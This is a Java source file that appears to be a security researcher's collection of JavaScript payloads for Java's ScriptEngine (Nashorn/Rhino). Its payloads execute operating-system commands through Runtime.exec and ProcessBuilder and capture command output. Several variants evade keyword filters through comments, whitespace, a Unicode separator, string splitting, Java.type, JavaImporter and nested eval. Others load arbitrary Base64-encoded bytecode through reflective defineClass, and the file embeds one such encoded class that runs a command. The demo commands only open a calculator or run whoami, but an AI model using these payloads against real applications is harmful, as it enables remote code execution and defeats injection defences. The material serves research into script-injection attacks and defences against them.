package org.command.code;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import javax.script.ScriptEngineManager;
import java.util.List;

/**
 * @author Whoopsunix
 * <p>
 * 参考: https://forum.butian.net/share/487
 */
public class ScriptEngineDemo {
    public static void exec() throws Exception {
        ScriptEngineManager manager = new ScriptEngineManager();
        ScriptEngine engine = manager.getEngineByName("js");

        // 基本 Runtime
        String runtime = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")";
//        engine.eval(runtime);

        // ProcessBuilder
        String processBuilder = "var s = [3];" +
                "s[0] = \"bash\";" +
                "s[1] = \"-c\";" +
                "s[2] = \"open -a Calculator.app\";" +
                "var x=new java.lang.ProcessBuilder;" +
                "x.command(s);" +
                "x.start();";
        String processBuilder2 =
                "var x=new java.lang.ProcessBuilder;" +
                        "x.command(\"bash\", \"-c\", \"open -a Calculator.app\");" +
                        "x.start();";
//        engine.eval(processBuilder2);

        // 获取执行结果
        String execResult = "var runtime = java.lang.Runtime.getRuntime(); " +
                "var process = runtime.exec(\"whoami\"); " +
                "var inputStream = process.getInputStream(); " +
                "var inputStreamReader = new java.io.InputStreamReader(inputStream); " +
                "var bufferedReader = new java.io.BufferedReader(inputStreamReader); " +
                "var line; " +
                "while ((line = bufferedReader.readLine()) != null) { " +
                "    print(line); " +
                "}";
//        engine.eval(execResult);
        // 作为结果返回
        String execResult2 =
                "var runtime = java.lang.Runtime.getRuntime();" +
                        "var process = runtime.exec(\"whoami\");" +
                        "var inputStream = process.getInputStream();" +
                        "var scanner = new java.util.Scanner(inputStream,\"GBK\").useDelimiter(\"\\\\A\");" +
                        "var result = scanner.hasNext() ? scanner.next() : \"\";" +
                        "scanner.close();" +
                        "result;";
//        System.out.println(engine.eval(execResult2));

        // 注释符绕过
        String commentBypass = "java.lang./**/Runtime.getRuntime().exec(\"open -a Calculator.app\")";
//        engine.eval(commentBypass);
        // 空格绕过
        String spaceBypass = "java.lang.  Runtime.getRuntime().exec(\"open -a Calculator.app\")";
//        engine.eval(spaceBypass);

        // 自定义方法
        String function = "var x=new Function('return'+'(new java.'+  'lang./**/ProcessBuilder)')();" +
                "x.command(\"open\", \"-a\", \"Calculator.app\");" +
                "x.start();" +
                "var a = mainOutput();" +
                "function mainOutput() {};";
//        engine.eval(function);

        // 调用 eval
        String eval = "var a = mainOutput();" +
                "function mainOutput() { " +
                "new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(\"" +
                "var a = test(); " +
                "function test() { " +
                "var x=java.lang.\"+\"Runtime.getRuntime().exec(\\\"open -a Calculator.app\\\");};\"); };";
//        engine.eval(eval);

        // type()
        String type = "var JavaTest= Java.type(\"java.lang\"+\".Runtime\"); var b =JavaTest.getRuntime(); b.exec(\"open -a Calculator.app\");";
        System.out.println(type);
//        engine.eval(type);

        // Rhino
        String rhino1 = "load(\"nashorn:mozilla_compat.js\"); importPackage(java.lang); var x=Runtime.getRuntime(); x.exec(\"open -a Calculator.app\");";
        String rhino2 = "var importer =JavaImporter(java.lang); with(importer){ var x=Runtime.getRuntime().exec(\"open -a Calculator.app\");}";
//        engine.eval(rhino2);

        // unicode
        // 见 jdk.nashorn.internal.parser.Lexer.JAVASCRIPT_WHITESPACE_IN_REGEXP
        String unicode = "java.lang.\u2029Runtime.getRuntime().exec(\"open -a Calculator.app\")";
//        engine.eval(unicode);

        // 注释符
        String comment1 = "java.lang./**/Runtime.getRuntime().exec(\"open -a Calculator.app\")";
        String comment2 = "java.lang.//\nRuntime.getRuntime().exec(\"open -a Calculator.app\")";


    }

    public static void defineClass(String javaClassBase64, String className) throws Exception {
        ScriptEngineManager manager = new ScriptEngineManager();
        ScriptEngine engine = manager.getEngineByName("js");

        // 字节码加载 java.util.Base64
        String code = "var data=\"" + javaClassBase64 + "\";" +
                "var bytes=java.util.Base64.getDecoder().decode(data);" +
                "var classLoader=new java.lang.ClassLoader() {};" +
                "var defineClassMethod = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                "defineClassMethod.setAccessible(true);" +
                "var loadedClass = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);" +
                "loadedClass.newInstance();";
//        engine.eval(code);

        // new java.lang.ClassLoader()   sun.misc.BASE64Decoder
        String code2 = "var data=\"" + javaClassBase64 + "\";\n" +
                "var aClass = java.lang.Class.forName(\"sun.misc.BASE64Decoder\");\n" +
                "var object = aClass.newInstance();\n" +
                "var bytes = aClass.getMethod(\"decodeBuffer\", java.lang.String.class).invoke(object, data);\n" +
                "var classLoader=new java.lang.ClassLoader() {};\n" +
                "var defineClassMethod = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "defineClassMethod.setAccessible(true);\n" +
                "var loadedClass = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "loadedClass.newInstance();";
//        engine.eval(code2);

        // java.lang.Thread.currentThread().getContextClassLoader()
        String code3 = "var data=\"" + javaClassBase64 + "\";" +
                "var bytes=java.util.Base64.getDecoder().decode(data);" +
                "var classLoader=java.lang.Thread.currentThread().getContextClassLoader();" +
                "var defineClassMethod = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                "defineClassMethod.setAccessible(true);" +
                "var loadedClass = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);" +
                "loadedClass.newInstance();";
//        engine.eval(code3);

        // 已加载过的 java.lang.Thread.currentThread().getContextClassLoader()
        String code4 = "var data=\"" + javaClassBase64 + "\";var bytes=java.util.Base64.getDecoder().decode(data);" +
                "var classLoader=java.lang.Thread.currentThread().getContextClassLoader();" +
                "try{" +
                "var clazz = classLoader.loadClass(\"" + className + "\");" +
                "clazz.newInstance();" +
                "}catch(err){" +
                "var defineClassMethod = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                "defineClassMethod.setAccessible(true);" +
                "var loadedClass = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);" +
                "loadedClass.newInstance();" +
                "};";
//        engine.eval(code4);

        // feihong 给出的先获取子 ClassLoader 方式
        String code5 = "var clazz = java.security.SecureClassLoader.class;\n" +
                "        var method = clazz.getSuperclass().getDeclaredMethod('defineClass', 'anything'.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "        method.setAccessible(true);\n" +
                "        var classBytes = '" + javaClassBase64 + "';" +
                "        var bytes = java.util.Base64.getDecoder().decode(classBytes);\n" +
                "        var constructor = clazz.getDeclaredConstructor();\n" +
                "        constructor.setAccessible(true);\n" +
                "        var clz = method.invoke(constructor.newInstance(), bytes, 0 , bytes.length);\nprint(clz);" +
                "        clz.newInstance();";
        engine.eval(code5);


    }

    public static void main(String[] args) throws Exception {
        printScriptEngineManagerFactories();
        exec();

//        String javaClassBase64 = new B64().encodeJavaClass(Exec.class);
//        System.out.println(javaClassBase64);
//        String javaClassBase64 = "yv66vgAAADQAMgoACwAZCQAaABsIABwKAB0AHgoAHwAgCAAhCgAfACIHACMIACQHACUHACYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAF0xvcmcvY29tbWFuZC9jb2RlL0V4ZWM7AQANU3RhY2tNYXBUYWJsZQcAJQcAIwEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEACUV4ZWMuamF2YQwADAANBwAnDAAoACkBAARFeGVjBwAqDAArACwHAC0MAC4ALwEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMADAAMQEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAtzdGF0aWMgRXhlYwEAFW9yZy9jb21tYW5kL2NvZGUvRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACgALAAAAAAACAAEADAANAAEADgAAAHYAAgACAAAAGiq3AAGyAAISA7YABLgABRIGtgAHV6cABEyxAAEABAAVABgACAADAA8AAAAaAAYAAAAHAAQACQAMAAoAFQAMABgACwAZAA0AEAAAAAwAAQAAABoAEQASAAAAEwAAABAAAv8AGAABBwAUAAEHABUAAAgAFgANAAEADgAAAFsAAgABAAAAFrIAAhIJtgAEuAAFEga2AAdXpwAES7EAAQAAABEAFAAIAAMADwAAABYABQAAABEACAASABEAFAAUABMAFQAVABAAAAACAAAAEwAAAAcAAlQHABUAAAEAFwAAAAIAGA==";
//        defineClass(javaClassBase64, "org.command.code.Exec");

    }

    /**
     * 获取引擎信息
     */
    public static void printScriptEngineManagerFactories() {
        ScriptEngineManager manager = new ScriptEngineManager();
        List<ScriptEngineFactory> factories = manager.getEngineFactories();
        for (ScriptEngineFactory factory : factories) {
            System.out.printf(
                    "Name: %s%n" + "Version: %s%n" + "Language name: %s%n" +
                            "Language version: %s%n" +
                            "Extensions: %s%n" +
                            "Mime types: %s%n" +
                            "Names: %s%n",
                    factory.getEngineName(),
                    factory.getEngineVersion(),
                    factory.getLanguageName(),
                    factory.getLanguageVersion(),
                    factory.getExtensions(),
                    factory.getMimeTypes(),
                    factory.getNames()
            );
        }
    }
}
